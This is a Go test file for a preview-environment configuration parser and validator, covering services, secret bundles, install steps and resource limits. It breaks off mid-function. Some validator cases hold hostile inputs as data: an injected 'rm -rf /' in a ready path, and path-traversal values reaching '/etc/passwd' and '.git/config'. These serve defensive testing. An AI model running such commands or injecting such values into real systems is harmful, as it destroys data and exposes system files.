package preview

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/assembledhq/143/internal/models"
	"github.com/assembledhq/143/internal/services/agent"
	"github.com/stretchr/testify/require"
)

func TestParseConfig_SingleService(t *testing.T) {
	t.Parallel()

	raw := `{
		"version": "3",
		"name": "frontend",
		"command": ["npm", "run", "dev"],
		"cwd": "frontend",
		"port": 3000,
		"env": {"NODE_ENV": "development"},
		"ready": {"http_path": "/", "timeout_seconds": 90},
		"credentials": {"mode": "none"},
		"network": {"mode": "managed", "destinations": []}
	}`

	cfg, err := ParseConfig([]byte(raw))
	if err != nil {
		t.Fatalf("ParseConfig() error = %v", err)
	}

	// Should normalize to multi-service with name as service key.
	if cfg.Primary != "frontend" {
		t.Errorf("Primary = %q, want %q", cfg.Primary, "frontend")
	}
	if len(cfg.Services) != 1 {
		t.Fatalf("len(Services) = %d, want 1", len(cfg.Services))
	}
	svc, ok := cfg.Services["frontend"]
	if !ok {
		t.Fatal("Services[\"frontend\"] not found")
	}
	if svc.Port != 3000 {
		t.Errorf("Port = %d, want 3000", svc.Port)
	}
	if svc.Cwd != "frontend" {
		t.Errorf("Cwd = %q, want %q", svc.Cwd, "frontend")
	}
	if len(svc.Command) != 3 || svc.Command[0] != "npm" {
		t.Errorf("Command = %v, want [npm run dev]", svc.Command)
	}
}

func TestParseConfig_MultiService(t *testing.T) {
	t.Parallel()

	raw := `{
		"version": "3",
		"name": "Full Stack",
		"primary": "frontend",
		"services": {
			"frontend": {
				"command": ["npm", "run", "dev"],
				"port": 3000,
				"ready": {"http_path": "/", "timeout_seconds": 90}
			},
			"backend": {
				"command": ["python", "manage.py", "runserver", "0.0.0.0:4000"],
				"cwd": "backend",
				"port": 4000,
				"ready": {"http_path": "/health", "timeout_seconds": 60}
			}
		},
		"credentials": {"mode": "none"},
		"network": {"mode": "managed"}
	}`

	cfg, err := ParseConfig([]byte(raw))
	if err != nil {
		t.Fatalf("ParseConfig() error = %v", err)
	}

	if cfg.Primary != "frontend" {
		t.Errorf("Primary = %q, want %q", cfg.Primary, "frontend")
	}
	if len(cfg.Services) != 2 {
		t.Errorf("len(Services) = %d, want 2", len(cfg.Services))
	}
}

func TestInspectConfigOptions(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name     string
		raw      string
		selected string
		expected ConfigOptions
	}{
		{
			name: "single preview config does not require selection",
			raw: `{
				"preview": {
					"name": "web",
					"command": ["npm", "run", "dev"],
					"port": 3000
				}
			}`,
			expected: ConfigOptions{
				Names:        []string{"web"},
				SelectedName: "web",
			},
		},
		{
			name: "multi config uses default",
			raw: `{
				"preview": {
					"default": "web",
					"configs": {
						"docs": {"name": "docs", "command": ["npm", "run", "docs"], "port": 3001},
						"web": {"name": "web", "command": ["npm", "run", "dev"], "port": 3000}
					}
				}
			}`,
			expected: ConfigOptions{
				Names:        []string{"docs", "web"},
				DefaultName:  "web",
				SelectedName: "web",
			},
		},
		{
			name: "multi config without default requires selection",
			raw: `{
				"preview": {
					"configs": {
						"api": {"name": "api", "command": ["go", "run", "."], "port": 8080},
						"web": {"name": "web", "command": ["npm", "run", "dev"], "port": 3000}
					}
				}
			}`,
			expected: ConfigOptions{
				Names:             []string{"api", "web"},
				RequiresSelection: true,
			},
		},
		{
			name:     "selected config is preserved",
			selected: "api",
			raw: `{
				"preview": {
					"default": "web",
					"configs": {
						"api": {"name": "api", "command": ["go", "run", "."], "port": 8080},
						"web": {"name": "web", "command": ["npm", "run", "dev"], "port": 3000}
					}
				}
			}`,
			expected: ConfigOptions{
				Names:        []string{"api", "web"},
				DefaultName:  "web",
				SelectedName: "api",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			actual, err := InspectConfigOptions([]byte(tt.raw), tt.selected)
			require.NoError(t, err, "InspectConfigOptions should parse valid preview config metadata")
			require.Equal(t, tt.expected, actual, "InspectConfigOptions should return exact config selection metadata")
		})
	}
}

func TestParseConfig_AcceptsNumericVersionMarker(t *testing.T) {
	t.Parallel()

	raw := `{
		"preview": {
			"version": 1,
			"name": "Full Stack",
			"primary": "frontend",
			"services": {
				"frontend": {
					"command": ["npm", "run", "dev"],
					"port": 3000,
					"ready": {"http_path": "/", "timeout_seconds": 90}
				}
			},
			"credentials": {"mode": "none"},
			"network": {"mode": "managed"}
		}
	}`

	cfg, err := ParseConfig([]byte(raw))
	require.NoError(t, err, "ParseConfig should accept numeric preview.version markers from committed repo configs")
	require.Equal(t, "1", cfg.Version, "ParseConfig should preserve a numeric version marker as its JSON text")
	require.Equal(t, "frontend", cfg.Primary, "ParseConfig should still parse the rest of the preview section")
}

func TestInvalidConfigMessage(t *testing.T) {
	t.Parallel()

	err := fmt.Errorf("%w: parse .143/config.json: parse preview config: invalid character 'n' looking for beginning of object key string", ErrInvalidConfig)

	msg := InvalidConfigMessage(err)

	require.Equal(
		t,
		"Invalid .143/config.json preview config: parse preview config: invalid character 'n' looking for beginning of object key string. Fix the committed config and start preview again.",
		msg,
		"InvalidConfigMessage should include the specific config failure and a recovery action without duplicating path prefixes",
	)
}

func TestParseConfig_WithInfrastructure(t *testing.T) {
	t.Parallel()

	raw := `{
		"version": "3",
		"name": "Full Stack (Local DB)",
		"primary": "frontend",
		"services": {
			"frontend": {"command": ["npm", "run", "dev"], "port": 3000, "ready": {"http_path": "/"}}
		},
		"infrastructure": {
			"db": {
				"template": "postgres-16",
				"init_script": "db/seed.sql",
				"inject_env": {"DATABASE_URL": "postgres://{{username}}:{{password}}@{{host}}:{{port}}/{{database}}"},
				"inject_into": ["frontend"]
			}
		},
		"credentials": {"mode": "none"},
		"network": {"mode": "managed"}
	}`

	cfg, err := ParseConfig([]byte(raw))
	if err != nil {
		t.Fatalf("ParseConfig() error = %v", err)
	}

	if len(cfg.Infrastructure) != 1 {
		t.Fatalf("len(Infrastructure) = %d, want 1", len(cfg.Infrastructure))
	}
	db := cfg.Infrastructure["db"]
	if db.Template != "postgres-16" {
		t.Errorf("Template = %q, want %q", db.Template, "postgres-16")
	}
	if db.InitScript != "db/seed.sql" {
		t.Errorf("InitScript = %q, want %q", db.InitScript, "db/seed.sql")
	}
}

func TestParseConfig_SecretBundle(t *testing.T) {
	t.Parallel()

	raw := `{
		"preview": {
			"name": "Full Stack",
			"primary": "webserver",
			"services": {
				"webserver": {"command": ["go", "run", "."], "port": 3000, "ready": {"http_path": "/health"}},
				"frontend": {"command": ["npm", "run", "dev"], "port": 8080, "ready": {"http_path": "/"}}
			},
			"secrets": {
				"bundle": "assembled-dev",
				"services": ["webserver", "frontend"],
				"env": ["MSGBROKER_QUEUE_TYPE"],
				"files": ["development.conf.json"]
			}
		}
	}`

	cfg, err := ParseConfig([]byte(raw))
	require.NoError(t, err, "ParseConfig should parse preview.secrets shorthand")
	require.Equal(t, []models.PreviewSecretBundleRef{{
		Bundle:   "assembled-dev",
		Services: []string{"webserver", "frontend"},
		Env:      []string{"MSGBROKER_QUEUE_TYPE"},
		Files:    []string{"development.conf.json"},
	}}, cfg.Secrets, "ParseConfig should preserve the repo-authored secret bundle contract")
	require.True(t, IsConnected(cfg), "secret bundle refs should make a preview connected")

	readiness := DetectReadiness(cfg)
	require.Equal(t, models.PreviewReadinessAdminSetupRequired, readiness.Readiness, "missing secret bundles should require admin setup")
	require.Equal(t, []models.MissingSecretBundle{{
		Bundle:   "assembled-dev",
		Services: []string{"webserver", "frontend"},
		Env:      []string{"MSGBROKER_QUEUE_TYPE"},
		Files:    []string{"development.conf.json"},
		Status:   "setup_required",
	}}, readiness.MissingSecretBundles, "readiness should expose non-secret bundle setup hints")
}

func TestValidateConfig_SecretBundleConstraints(t *testing.T) {
	t.Parallel()

	cfg := validPreviewConfig()
	cfg.Secrets = []models.PreviewSecretBundleRef{{
		Bundle:   "repo-dev",
		Services: []string{"missing"},
		Env:      []string{"1BAD"},
		Files:    []string{"../development.conf.json", ".git/config"},
	}}

	errs := ValidateConfig(cfg)

	require.Contains(t, errs, `secrets[0]: services references unknown service "missing"`, "secret bundle services should be constrained to declared services")
	require.Contains(t, errs, `secrets[0]: env "1BAD" is not a valid environment variable name`, "secret bundle env hints should be valid env names")
	require.Contains(t, errs, `secrets[0]: files: path "../development.conf.json" escapes the repo root`, "secret bundle file hints should not escape the repo")
	require.Contains(t, errs, `secrets[0]: files: path ".git/config" must not target .git`, "secret bundle file hints should not target git metadata")
}

func TestValidateConfig_SecretBundleFileHintsRequireAllServices(t *testing.T) {
	t.Parallel()

	cfg := validPreviewConfig()
	cfg.Services["frontend"] = models.ServiceConfig{Command: []string{"npm", "run", "dev"}, Port: 8080, Ready: models.ReadinessProbe{HTTPPath: "/"}}
	cfg.Secrets = []models.PreviewSecretBundleRef{{
		Bundle:   "repo-dev",
		Services: []string{"web"},
		Files:    []string{"development.conf.json"},
	}}

	errs := ValidateConfig(cfg)

	require.Contains(t, errs, `secrets[0]: files are workspace-wide, so services must include every preview service`, "file hints should not imply narrower service scoping than the runtime can enforce")
}

func TestParseConfig_FromRepoConfigPreviewSection(t *testing.T) {
	t.Parallel()

	raw := `{
		"preview": {
			"version": "3",
			"name": "dogfood",
			"primary": "web",
			"services": {
				"web": {
					"command": ["npm", "run", "dev"],
					"port": 3000,
					"ready": {"http_path": "/"}
				}
			},
			"credentials": {"mode": "none"},
			"network": {"mode": "managed"}
		},
		"validation": {
			"commands": ["npm run lint:js"]
		}
	}`

	cfg, err := ParseConfig([]byte(raw))
	require.NoError(t, err, "ParseConfig should accept nested preview config inside .143/config.json")
	require.Equal(t, "web", cfg.Primary, "ParseConfig should parse the nested preview section")
	require.Contains(t, cfg.Services, "web", "ParseConfig should preserve services from the nested preview section")
}

func TestParseConfig_WithPreviewInstall(t *testing.T) {
	t.Parallel()

	raw := `{
		"preview": {
			"version": "3",
			"name": "dogfood",
			"primary": "web",
			"install": {
				"command": ["npm", "ci", "--no-audit", "--no-fund"],
				"cwd": ".",
				"lockfiles": ["package-lock.json"],
				"clean_paths": ["node_modules", "packages/*/node_modules"],
				"verify_paths": ["node_modules/.bin/next"]
			},
			"services": {
				"web": {
					"command": ["npm", "run", "dev"],
					"port": 3000,
					"ready": {"http_path": "/"}
				}
			},
			"credentials": {"mode": "none"},
			"network": {"mode": "managed"}
		}
	}`

	cfg, err := ParseConfig([]byte(raw))
	require.NoError(t, err, "ParseConfig should accept preview.install")
	require.NotNil(t, cfg.Install, "ParseConfig should preserve preview.install")
	require.Equal(t, []string{"npm", "ci", "--no-audit", "--no-fund"}, cfg.Install.Command, "install command should round-trip")
	require.Equal(t, ".", cfg.Install.Cwd, "install cwd should round-trip")
	require.Equal(t, []string{"package-lock.json"}, cfg.Install.Lockfiles, "install lockfiles should round-trip")
	require.Equal(t, []string{"node_modules", "packages/*/node_modules"}, cfg.Install.CleanPaths, "install clean paths should round-trip")
	require.Equal(t, []string{"node_modules/.bin/next"}, cfg.Install.VerifyPaths, "install verify paths should round-trip")
	require.Equal(t, DefaultInstallTimeoutSeconds, cfg.Install.TimeoutSeconds, "install timeout should default when omitted")
}

func TestParseConfig_WithResources(t *testing.T) {
	t.Parallel()

	raw := `{
		"preview": {
			"version": "1",
			"name": "Full Stack",
			"primary": "frontend",
			"resources": {
				"requests": {
					"cpu": "500m",
					"memory": "768Mi",
					"ephemeral-storage": "5Gi"
				},
				"limits": {
					"cpu": "1.5",
					"memory": "1Gi",
					"ephemeral-storage": "10gb"
				}
			},
			"services": {
				"frontend": {
					"command": ["npm", "run", "dev"],
					"port": 3000,
					"ready": {"http_path": "/"}
				}
			},
			"credentials": {"mode": "none"},
			"network": {"mode": "managed"}
		}
	}`

	cfg, err := ParseConfig([]byte(raw))
	require.NoError(t, err, "ParseConfig should accept Kubernetes-style preview resources")
	require.Equal(t, "500m", cfg.Resources.Requests.CPU, "ParseConfig should preserve requested CPU quantity")
	require.Equal(t, "768Mi", cfg.Resources.Requests.Memory, "ParseConfig should preserve requested memory quantity")
	require.Equal(t, "5Gi", cfg.Resources.Requests.EphemeralStorage, "ParseConfig should preserve requested storage quantity")
	require.Equal(t, "1.5", cfg.Resources.Limits.CPU, "ParseConfig should preserve limit CPU quantity")
	require.Equal(t, "1Gi", cfg.Resources.Limits.Memory, "ParseConfig should preserve limit memory quantity")
	require.Equal(t, "10gb", cfg.Resources.Limits.EphemeralStorage, "ParseConfig should preserve limit storage quantity")
}

func TestDogfoodPreviewConfig_ServerUsesRegisteredReadinessPath(t *testing.T) {
	t.Parallel()

	_, file, _, ok := runtime.Caller(0)
	require.True(t, ok, "test should resolve its source file path")
	repoRoot := filepath.Clean(filepath.Join(filepath.Dir(file), "..", "..", ".."))

	raw, err := os.ReadFile(filepath.Join(repoRoot, ".143", "config.json"))
	require.NoError(t, err, "dogfood preview config should be readable")

	cfg, err := ParseConfig(raw)
	require.NoError(t, err, "dogfood preview config should parse")
	server, ok := cfg.Services["server"]
	require.True(t, ok, "dogfood preview config should define the server service")
	require.Equal(t, "/readyz", server.Ready.HTTPPath, "server readiness probe should hit the registered public readiness endpoint")
}

func TestParseConfig_RepoConfigWithoutPreviewSection(t *testing.T) {
	t.Parallel()

	_, err := ParseConfig([]byte(`{
		"validation": {
			"commands": ["npm run lint:js"]
		}
	}`))
	require.Error(t, err, "ParseConfig should reject .143/config.json files that omit the preview section")
	require.Contains(t, err.Error(), "missing preview section", "ParseConfig should explain that .143/config.json requires a preview section for preview parsing")
}

func TestParseConfig_RepoConfigWithOnlyDependenciesWithoutPreviewSection(t *testing.T) {
	t.Parallel()

	_, err := ParseConfig([]byte(`{
		"dependencies": {
			"golangci-lint": "2.10.1"
		}
	}`))
	require.Error(t, err, "ParseConfig should reject .143/config.json dependency-only files that omit the preview section")
	require.Contains(t, err.Error(), "missing preview section", "ParseConfig should recognize dependencies as repo config and explain that preview is missing")
}

func TestParseConfig_InvalidJSON(t *testing.T) {
	t.Parallel()

	_, err := ParseConfig([]byte(`{invalid`))
	if err == nil {
		t.Fatal("expected error for invalid JSON")
	}
}

func TestParseConfig_BothFormats(t *testing.T) {
	t.Parallel()

	raw := `{
		"version": "3",
		"name": "test",
		"command": ["echo"],
		"port": 3000,
		"services": {"web": {"command": ["npm", "start"], "port": 3000, "ready": {"http_path": "/"}}},
		"credentials": {"mode": "none"},
		"network": {"mode": "managed"}
	}`
	_, err := ParseConfig([]byte(raw))
	if err == nil {
		t.Fatal("expected error when both single-service and multi-service fields present")
	}
}

func TestValidateConfig(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		cfg     models.PreviewConfig
		wantErr int // expected error count, 0 = valid
	}{
		{
			name: "valid single service",
			cfg: models.PreviewConfig{
				Primary:        "app",
				Services:       map[string]models.ServiceConfig{"app": {Command: []string{"npm", "start"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
				Infrastructure: map[string]models.InfrastructureConfig{},
			},
			wantErr: 0,
		},
		{
			name: "valid multi service",
			cfg: models.PreviewConfig{
				Primary: "frontend",
				Services: map[string]models.ServiceConfig{
					"frontend": {Command: []string{"npm", "start"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}},
					"backend":  {Command: []string{"python", "app.py"}, Port: 4000, Ready: models.ReadinessProbe{HTTPPath: "/health"}},
				},
				Infrastructure: map[string]models.InfrastructureConfig{},
			},
			wantErr: 0,
		},
		{
			name: "missing primary",
			cfg: models.PreviewConfig{
				Services:       map[string]models.ServiceConfig{"app": {Command: []string{"npm"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
				Infrastructure: map[string]models.InfrastructureConfig{},
			},
			wantErr: 1,
		},
		{
			name: "primary references missing service",
			cfg: models.PreviewConfig{
				Primary:        "missing",
				Services:       map[string]models.ServiceConfig{"app": {Command: []string{"npm"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
				Infrastructure: map[string]models.InfrastructureConfig{},
			},
			wantErr: 1,
		},
		{
			name: "no services",
			cfg: models.PreviewConfig{
				Primary:        "app",
				Services:       map[string]models.ServiceConfig{},
				Infrastructure: map[string]models.InfrastructureConfig{},
			},
			wantErr: 2, // no services + primary references missing
		},
		{
			name: "too many services",
			cfg: models.PreviewConfig{
				Primary: "a",
				Services: map[string]models.ServiceConfig{
					"a": {Command: []string{"a"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}},
					"b": {Command: []string{"b"}, Port: 3001, Ready: models.ReadinessProbe{HTTPPath: "/"}},
					"c": {Command: []string{"c"}, Port: 3002, Ready: models.ReadinessProbe{HTTPPath: "/"}},
					"d": {Command: []string{"d"}, Port: 3003, Ready: models.ReadinessProbe{HTTPPath: "/"}},
					"e": {Command: []string{"e"}, Port: 3004, Ready: models.ReadinessProbe{HTTPPath: "/"}},
				},
				Infrastructure: map[string]models.InfrastructureConfig{},
			},
			wantErr: 1,
		},
		{
			name: "port out of range",
			cfg: models.PreviewConfig{
				Primary:        "app",
				Services:       map[string]models.ServiceConfig{"app": {Command: []string{"npm"}, Port: 80, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
				Infrastructure: map[string]models.InfrastructureConfig{},
			},
			wantErr: 1,
		},
		{
			name: "duplicate ports",
			cfg: models.PreviewConfig{
				Primary: "a",
				Services: map[string]models.ServiceConfig{
					"a": {Command: []string{"a"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}},
					"b": {Command: []string{"b"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}},
				},
				Infrastructure: map[string]models.InfrastructureConfig{},
			},
			wantErr: 1,
		},
		{
			name: "missing command",
			cfg: models.PreviewConfig{
				Primary:        "app",
				Services:       map[string]models.ServiceConfig{"app": {Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
				Infrastructure: map[string]models.InfrastructureConfig{},
			},
			wantErr: 1,
		},
		{
			name: "missing ready path",
			cfg: models.PreviewConfig{
				Primary:        "app",
				Services:       map[string]models.ServiceConfig{"app": {Command: []string{"npm"}, Port: 3000}},
				Infrastructure: map[string]models.InfrastructureConfig{},
			},
			wantErr: 1,
		},
		{
			name: "shell injection in ready path",
			cfg: models.PreviewConfig{
				Primary:        "app",
				Services:       map[string]models.ServiceConfig{"app": {Command: []string{"npm"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/; rm -rf /"}}},
				Infrastructure: map[string]models.InfrastructureConfig{},
			},
			wantErr: 1,
		},
		{
			name: "cwd escapes repo root",
			cfg: models.PreviewConfig{
				Primary:        "app",
				Services:       map[string]models.ServiceConfig{"app": {Command: []string{"npm"}, Port: 3000, Cwd: "../../etc", Ready: models.ReadinessProbe{HTTPPath: "/"}}},
				Infrastructure: map[string]models.InfrastructureConfig{},
			},
			wantErr: 1,
		},
		{
			name: "cwd is absolute path",
			cfg: models.PreviewConfig{
				Primary:        "app",
				Services:       map[string]models.ServiceConfig{"app": {Command: []string{"npm"}, Port: 3000, Cwd: "/etc/passwd", Ready: models.ReadinessProbe{HTTPPath: "/"}}},
				Infrastructure: map[string]models.InfrastructureConfig{},
			},
			wantErr: 1,
		},
		{
			name: "unsupported infra template",
			cfg: models.PreviewConfig{
				Primary:  "app",
				Services: map[string]models.ServiceConfig{"app": {Command: []string{"npm"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
				Infrastructure: map[string]models.InfrastructureConfig{
					"search": {Template: "elasticsearch-8"},
				},
			},
			wantErr: 1,
		},
		{
			name: "too many infra",
			cfg: models.PreviewConfig{
				Primary:  "app",
				Services: map[string]models.ServiceConfig{"app": {Command: []string{"npm"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
				Infrastructure: map[string]models.InfrastructureConfig{
					"db":    {Template: "postgres-16"},
					"cache": {Template: "redis-7"},
					"extra": {Template: "mysql-8"},
				},
			},
			wantErr: 1,
		},
		{
			name: "infra inject_into unknown service",
			cfg: models.PreviewConfig{
				Primary:  "app",
				Services: map[string]models.ServiceConfig{"app": {Command: []string{"npm"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
				Infrastructure: map[string]models.InfrastructureConfig{
					"db": {Template: "postgres-16", InjectInto: []string{"nonexistent"}},
				},
			},
			wantErr: 1,
		},
		{
			name: "credential inject_into unknown service",
			cfg: models.PreviewConfig{
				Primary:        "app",
				Services:       map[string]models.ServiceConfig{"app": {Command: []string{"npm"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
				Infrastructure: map[string]models.InfrastructureConfig{},
				Credentials:    models.CredentialConfig{Mode: "managed_env", InjectInto: []string{"unknown"}},
			},
			wantErr: 1,
		},
		{
			name: "init_script escapes repo",
			cfg: models.PreviewConfig{
				Primary:  "app",
				Services: map[string]models.ServiceConfig{"app": {Command: []string{"npm"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
				Infrastructure: map[string]models.InfrastructureConfig{
					"db": {Template: "postgres-16", InitScript: "../../../etc/passwd"},
				},
			},
			wantErr: 1,
		},
		{
			name: "invalid network mode",
			cfg: models.PreviewConfig{
				Primary:        "app",
				Services:       map[string]models.ServiceConfig{"app": {Command: []string{"npm"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
				Infrastructure: map[string]models.InfrastructureConfig{},
				Network:        models.NetworkConfig{Mode: "bogus"},
			},
			wantErr: 1,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			errs := ValidateConfig(&tt.cfg)
			if len(errs) != tt.wantErr {
				t.Errorf("ValidateConfig() returned %d errors, want %d: %v", len(errs), tt.wantErr, errs)
			}
		})
	}
}

func TestValidateConfig_PreviewInstall(t *testing.T) {
	t.Parallel()

	base := func(install *models.PreviewInstallConfig) models.PreviewConfig {
		return models.PreviewConfig{
			Primary:        "app",
			Services:       map[string]models.ServiceConfig{"app": {Command: []string{"npm", "start"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
			Infrastructure: map[string]models.InfrastructureConfig{},
			Install:        install,
		}
	}

	tests := []struct {
		name       string
		install    *models.PreviewInstallConfig
		wantErrSub string
	}{
		{
			name: "valid npm workspace install",
			install: &models.PreviewInstallConfig{
				Command:        []string{"npm", "ci", "--no-audit", "--no-fund"},
				Cwd:            ".",
				Lockfiles:      []string{"package-lock.json"},
				CleanPaths:     []string{"node_modules", "packages/*/node_modules"},
				VerifyPaths:    []string{"node_modules/.bin/next"},
				TimeoutSeconds: 420,
			},
		},
		{
			name:       "missing command",
			install:    &models.PreviewInstallConfig{Lockfiles: []string{"package-lock.json"}},
			wantErrSub: "preview.install.command is required",
		},
		{
			name:       "empty lockfiles",
			install:    &models.PreviewInstallConfig{Command: []string{"npm", "ci"}, Lockfiles: []string{""}},
			wantErrSub: "preview.install.lockfiles[0] is required",
		},
		{
			name:       "empty clean path",
			install:    &models.PreviewInstallConfig{Command: []string{"npm", "ci"}, CleanPaths: []string{""}},
			wantErrSub: "preview.install.clean_paths[0] is required",
		},
		{
			name:       "unsafe cwd",
			install:    &models.PreviewInstallConfig{Command: []string{"npm", "ci"}, Cwd: "../outside"},
			wantErrSub: "preview.install.cwd",
		},
		{
			name:       "unsafe clean path",
			install:    &models.PreviewInstallConfig{Command: []string{"npm", "ci"}, CleanPaths: []string{"/tmp/node_modules"}},
			wantErrSub: "preview.install.clean_paths[0]",
		},
		{
			name:       "invalid timeout",
			install:    &models.PreviewInstallConfig{Command: []string{"npm", "ci"}, TimeoutSeconds: MaxInstallTimeoutSeconds + 1},
			wantErrSub: "preview.install.timeout_seconds",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			cfg := base(tt.install)
			errs := ValidateConfig(&cfg)
			if tt.wantErrSub == "" {
				require.Empty(t, errs, "valid preview.install should pass validation")
				return
			}
			require.NotEmpty(t, errs, "invalid preview.install should return a validation error")
			require.Contains(t, strings.Join(errs, "\n"), tt.wantErrSub, "validation errors should identify the invalid preview.install field")
		})
	}
}

func TestValidateConfig_Resources(t *testing.T) {
	t.Parallel()

	base := func(resources models.PreviewResourceRequirements) models.PreviewConfig {
		return models.PreviewConfig{
			Primary:        "app",
			Services:       map[string]models.ServiceConfig{"app": {Command: []string{"npm", "start"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
			Infrastructure: map[string]models.InfrastructureConfig{},
			Resources:      resources,
		}
	}

	tests := []struct {
		name       string
		resources  models.PreviewResourceRequirements
		wantErrSub string
	}{
		{
			name: "valid requests and limits",
			resources: models.PreviewResourceRequirements{
				Requests: models.PreviewResourceList{CPU: "500m", Memory: "512Mi", EphemeralStorage: "5Gi"},
				Limits:   models.PreviewResourceList{CPU: "1", Memory: "1Gi", EphemeralStorage: "10Gi"},
			},
		},
		{
			name:       "invalid memory unit",
			resources:  models.PreviewResourceRequirements{Limits: models.PreviewResourceList{Memory: "1parsec"}},
			wantErrSub: "preview.resources.limits.memory",
		},
		{
			name:       "zero cpu",
			resources:  models.PreviewResourceRequirements{Limits: models.PreviewResourceList{CPU: "0"}},
			wantErrSub: "preview.resources.limits.cpu",
		},
		{
			name:       "negative storage",
			resources:  models.PreviewResourceRequirements{Limits: models.PreviewResourceList{EphemeralStorage: "-1Gi"}},
			wantErrSub: "preview.resources.limits.ephemeral-storage",
		},
		{
			name:       "memory exceeds cap",
			resources:  models.PreviewResourceRequirements{Limits: models.PreviewResourceList{Memory: "16Gi"}},
			wantErrSub: "at most 8Gi",
		},
		{
			name:       "storage exceeds cap",
			resources:  models.PreviewResourceRequirements{Limits: models.PreviewResourceList{EphemeralStorage: "11Gi"}},
			wantErrSub: "at most 10Gi",
		},
		{
			name: "request exceeds limit",
			resources: models.PreviewResourceRequirements{
				Requests: models.PreviewResourceList{CPU: "1500m", Memory: "768Mi", EphemeralStorage: "6Gi"},
				Limits:   models.PreviewResourceList{CPU: "1", Memory: "512Mi", EphemeralStorage: "5Gi"},
			},
			wantErrSub: "must be less than or equal to",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			cfg := base(tt.resources)
			errs := ValidateConfig(&cfg)
			if tt.wantErrSub == "" {
				require.Empty(t, errs, "valid preview resources should pass validation")
				return
			}
			require.NotEmpty(t, errs, "invalid preview resources should return validation errors")
			require.Contains(t, strings.Join(errs, "\n"), tt.wantErrSub, "validation errors should identify the invalid preview resource")
		})
	}
}

func TestParseByteQuantityMiB(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name     string
		raw      string
		expected int
	}{
		{name: "mebibytes", raw: "512Mi", expected: 512},
		{name: "gibibytes", raw: "1Gi", expected: 1024},
		{name: "decimal megabytes", raw: "500mb", expected: 477},
		{name: "decimal gigabytes", raw: "5gb", expected: 4769},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			actual, ok, err := parseByteQuantityMiB("test.quantity", tt.raw)
			require.NoError(t, err, "byte quantity should parse")
			require.True(t, ok, "byte quantity should be treated as set")
			require.Equal(t, tt.expected, actual, "byte quantity should normalize to MiB")
		})
	}
}

func TestParseCPUQuantity(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name     string
		raw      string
		expected int
	}{
		{name: "millicores", raw: "500m", expected: 500},
		{name: "whole core", raw: "1", expected: 1000},
		{name: "fractional cores", raw: "1.5", expected: 1500},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			actual, ok, err := parseCPUQuantity("test.cpu", tt.raw)
			require.NoError(t, err, "CPU quantity should parse")
			require.True(t, ok, "CPU quantity should be treated as set")
			require.Equal(t, tt.expected, actual, "CPU quantity should normalize to millicores")
		})
	}
}

func TestResolveConfig_NonConnected(t *testing.T) {
	t.Parallel()

	baseCfg := &models.PreviewConfig{
		Version: "3",
		Name:    "Test",
		Primary: "frontend",
		Install: &models.PreviewInstallConfig{
			Command:    []string{"npm", "ci"},
			Lockfiles:  []string{"package-lock.json"},
			CleanPaths: []string{"node_modules"},
		},
		Services: map[string]models.ServiceConfig{
			"frontend": {Command: []string{"npm", "start"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}},
			"backend":  {Command: []string{"python", "app.py"}, Port: 4000, Ready: models.ReadinessProbe{HTTPPath: "/health"}},
		},
		Infrastructure: map[string]models.InfrastructureConfig{
			"db": {Template: "postgres-16", InitScript: "db/base_seed.sql", InjectInto: []string{"backend"}},
		},
		Resources: models.PreviewResourceRequirements{
			Limits: models.PreviewResourceList{CPU: "500m", Memory: "512Mi", EphemeralStorage: "5Gi"},
		},
		Credentials: models.CredentialConfig{Mode: "none"},
		Network:     models.NetworkConfig{Mode: "managed"},
	}

	diffCfg := &models.PreviewConfig{
		Install: &models.PreviewInstallConfig{
			Command:     []string{"pnpm", "install", "--frozen-lockfile"},
			Lockfiles:   []string{"pnpm-lock.yaml"},
			CleanPaths:  []string{"node_modules", "apps/*/node_modules"},
			VerifyPaths: []string{"node_modules/.bin/next"},
		},
		Services: map[string]models.ServiceConfig{
			"frontend": {Command: []string{"npm", "run", "dev"}, Port: 3000, Cwd: "frontend", Ready: models.ReadinessProbe{HTTPPath: "/", TimeoutSeconds: 120}},
			"backend":  {Command: []string{"python", "app.py", "--debug"}, Port: 4000, Ready: models.ReadinessProbe{HTTPPath: "/health"}},
		},
		Infrastructure: map[string]models.InfrastructureConfig{
			"db": {Template: "postgres-16", InitScript: "db/test_seed.sql"},
		},
		Resources: models.PreviewResourceRequirements{
			Limits: models.PreviewResourceList{CPU: "1", Memory: "768Mi", EphemeralStorage: "10Gi"},
		},
	}

	resolved, err := ResolveConfig(baseCfg, diffCfg)
